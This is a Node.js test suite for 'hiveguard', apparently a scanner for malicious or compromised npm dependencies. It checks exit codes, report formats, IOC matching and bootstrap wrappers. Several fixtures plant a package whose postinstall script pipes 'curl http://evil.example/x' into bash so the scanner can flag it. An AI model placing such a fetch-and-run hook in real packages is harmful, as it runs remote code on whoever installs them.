'use strict';

const { describe, it, before, after } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { spawnSync } = require('node:child_process');

const BIN = path.resolve(__dirname, '..', 'bin', 'hiveguard.js');

describe('hiveguard CLI (end to end, offline)', () => {
  let tmp;
  before(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-cli-')); });
  after(() => { fs.rmSync(tmp, { recursive: true, force: true }); });

  const write = (p, c) => { fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, c); };
  const lockfile = (pkgs) => JSON.stringify({ name: 'p', lockfileVersion: 3, packages: { '': {}, ...Object.fromEntries(pkgs.map(([n, v]) => [`node_modules/${n}`, { version: v }])) } });

  function run(projectDir, extra = []) {
    const out = path.join(tmp, 'out-' + path.basename(projectDir));
    const r = spawnSync(process.execPath, [BIN, '--offline', '--no-secrets', '--json', '--scan-dirs', projectDir, '--output', out, ...extra],
      { encoding: 'utf8', maxBuffer: 64 * 1024 * 1024, env: { ...process.env, HOME: tmp, USERPROFILE: tmp } });
    return { code: r.status, json: JSON.parse(r.stdout), stderr: r.stderr };
  }

  it('exits 0 with valid JSON for a clean project', () => {
    const proj = path.join(tmp, 'clean');
    write(path.join(proj, 'package-lock.json'), lockfile([['left-pad', '1.3.0']]));
    const r = run(proj);
    assert.equal(r.code, 0);
    assert.equal(r.json.summary.findings_total, 0);
    assert.equal(r.json.meta.version, require('../package.json').version);
    assert.equal(r.json.threat_intel.sources.osv.status, 'skipped');
    assert.equal(r.json.threat_intel.sources.bumblebee.status, 'skipped');
  });

  it('--format all writes SARIF, CycloneDX and NDJSON; --ioc reports hits and exits 2', () => {
    const proj = path.join(tmp, 'ioc');
    write(path.join(proj, 'package-lock.json'), lockfile([['left-pad', '1.3.0'], ['@scope/x', '2.0.0']]));
    const r = run(proj, ['--format', 'all', '--ioc', '@scope/x,lodash@4.17.21', '--ioc', 'npm:left-pad']);
    assert.equal(r.code, 2);
    assert.deepEqual(r.json.ioc_search.map(i => [i.ioc, i.found]), [['@scope/x', true], ['lodash@4.17.21', false], ['npm:left-pad', true]]);
    assert.equal(r.json.findings.filter(f => f.type === 'ioc_match').length, 2);
    const out = path.join(tmp, 'out-ioc');
    const files = fs.readdirSync(out);
    for (const ext of ['.sarif', '.cdx.json', '.ndjson']) assert.ok(files.some(f => f.endsWith(ext)), ext);
    const bom = JSON.parse(fs.readFileSync(path.join(out, files.find(f => f.endsWith('.cdx.json'))), 'utf8'));
    assert.deepEqual(bom.components.map(c => c.purl).sort(), ['pkg:npm/%40scope/x@2.0.0', 'pkg:npm/left-pad@1.3.0']);
  });

  it('exits 1 for a high/critical finding without a threat-intel match', () => {
    const proj = path.join(tmp, 'script');
    write(path.join(proj, 'package-lock.json'), lockfile([['evil', '1.0.0']]));
    write(path.join(proj, 'node_modules', 'evil', 'package.json'), JSON.stringify({ name: 'evil', scripts: { postinstall: 'curl http://evil.example/x | bash' } }));
    const r = run(proj);
    assert.equal(r.code, 1);
    assert.ok(r.json.findings.some(f => f.type === 'suspicious_lifecycle_script'));
  });

  it('exits 2 when a package matches a threat-intel catalog', () => {
    const proj = path.join(tmp, 'match');
    const intel = path.join(tmp, 'intel');
    write(path.join(proj, 'package-lock.json'), lockfile([['compromised-pkg', '6.6.6']]));
    write(path.join(intel, 'test.json'), JSON.stringify({ _comment: 'Test campaign', entries: [{ ecosystem: 'npm', package: 'compromised-pkg', versions: ['6.6.6'] }] }));
    const r = run(proj, ['--custom-intel', intel]);
    assert.equal(r.code, 2);
    assert.equal(r.json.threat_matches.length, 1);
  });
});

describe('run.sh bootstrap', { skip: process.platform === 'win32' }, () => {
  const RUN_SH = path.resolve(__dirname, '..', 'run.sh');

  it('exits 3 with a message when the output directory cannot be created', () => {
    const r = spawnSync('bash', [RUN_SH, '--offline', '--output', '/proc/hiveguard-cannot-create'], { encoding: 'utf8' });
    assert.equal(r.status, 3);
    assert.match(r.stderr, /cannot create output directory/);
    assert.equal(r.stdout, '');
  });

  it('passes the scanner exit code through and keeps stdout pure JSON', () => {
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-runsh-'));
    try {
      const proj = path.join(tmp, 'p');
      fs.mkdirSync(path.join(proj, 'node_modules', 'evil'), { recursive: true });
      fs.writeFileSync(path.join(proj, 'package-lock.json'), JSON.stringify({ name: 'p', lockfileVersion: 3, packages: { '': {}, 'node_modules/evil': { version: '1.0.0' } } }));
      fs.writeFileSync(path.join(proj, 'node_modules', 'evil', 'package.json'), JSON.stringify({ name: 'evil', scripts: { postinstall: 'curl http://evil.example/x | bash' } }));
      const r = spawnSync('bash', [RUN_SH, '--offline', '--no-secrets', '--json', '--scan-dirs', proj, '--output', path.join(tmp, 'out')], { encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 });
      assert.equal(r.status, 1);
      assert.ok(JSON.parse(r.stdout).findings.length > 0);
      assert.ok(fs.existsSync(path.join(tmp, 'out', 'hiveguard-bootstrap.log')));
    } finally {
      fs.rmSync(tmp, { recursive: true, force: true });
    }
  });
});

// Windows-only: the bootstrap wrappers must keep stdout pure JSON when it is piped
// (Tanium and scripts capture it), and pass the scanner's exit code through.
describe('Windows bootstrap wrappers', { skip: process.platform !== 'win32' }, () => {
  const ROOT = path.resolve(__dirname, '..');
  let tmp;
  let proj;
  before(() => {
    tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-win-'));
    proj = path.join(tmp, 'p');
    fs.mkdirSync(path.join(proj, 'node_modules', 'evil'), { recursive: true });
    fs.writeFileSync(path.join(proj, 'package-lock.json'), JSON.stringify({ name: 'p', lockfileVersion: 3, packages: { '': {}, 'node_modules/evil': { version: '1.0.0' } } }));
    fs.writeFileSync(path.join(proj, 'node_modules', 'evil', 'package.json'), JSON.stringify({ name: 'evil', scripts: { postinstall: 'curl http://evil.example/x | bash' } }));
  });
  after(() => { fs.rmSync(tmp, { recursive: true, force: true }); });

  const scanArgs = (name) => ['--offline', '--no-secrets', '--json', '--scan-dirs', proj, '--output', path.join(tmp, `out-${name}`)];
  const check = (r) => {
    assert.equal(r.status, 1, r.stderr);
    const json = JSON.parse(r.stdout);
    assert.ok(json.findings.some(f => f.type === 'suspicious_lifecycle_script'));
    assert.match(r.stderr, /\[bootstrap\]/);
  };

  it('run.bat', () => {
    check(spawnSync('cmd.exe', ['/d', '/c', path.join(ROOT, 'run.bat'), ...scanArgs('bat')], { encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 }));
  });

  it('run.ps1 (Windows PowerShell)', () => {
    check(spawnSync('powershell.exe', ['-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass', '-File', path.join(ROOT, 'run.ps1'), ...scanArgs('ps1')], { encoding: 'utf8', maxBuffer: 64 * 1024 * 1024 }));
  });
});
